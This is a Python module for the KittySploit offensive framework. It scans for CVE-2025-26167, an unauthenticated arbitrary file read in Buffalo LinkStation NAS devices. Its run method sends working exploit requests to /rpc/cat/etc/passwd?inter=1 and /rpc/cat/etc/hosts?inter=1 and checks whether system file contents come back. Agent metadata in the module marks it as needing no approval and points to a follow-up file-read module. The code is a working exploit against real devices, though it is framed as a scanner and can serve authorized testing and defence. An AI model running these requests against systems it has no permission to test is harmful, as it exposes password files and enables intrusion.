#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Buffalo LinkStation unauthenticated arbitrary file read via /rpc/cat/ (CVE-2025-26167)."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Buffalo LinkStation - Arbitrary File Read (CVE-2025-26167)',
        'description': (
            'Buffalo LinkStation exposes /rpc/cat/<path>?inter=1 without authentication, '
            'allowing remote attackers to read arbitrary files (e.g. password hashes).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': [
            'web', 'scanner', 'cve', 'cve2025', 'buffalo', 'linkstation', 'nas',
            'lfi', 'exposure', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'risk_signal', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/admin/http/buffalo_cve_2025_26167_file_read'],
            },
        },
        'references': [
            'https://github.com/SpikeReply/advisories/blob/0f15f5aefb959fbaff049da7cc3e36733e25b580/cve/buffalo/cve-2025-26167.md',
            'https://nvd.nist.gov/vuln/detail/CVE-2025-26167',
        ],
        'cve': 'CVE-2025-26167',
    }

    def run(self):
        probes = (
            ('/rpc/cat/etc/passwd?inter=1', r'root:.*:0:0:'),
            ('/rpc/cat/etc/hosts?inter=1', r'localhost'),
        )
        for path, pattern in probes:
            r = self.http_request(method='GET', path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ''
            if re.search(pattern, body):
                self.set_info(
                    severity='high',
                    reason='Buffalo LinkStation CVE-2025-26167 arbitrary file read',
                    path=path,
                )
                return True
        return False
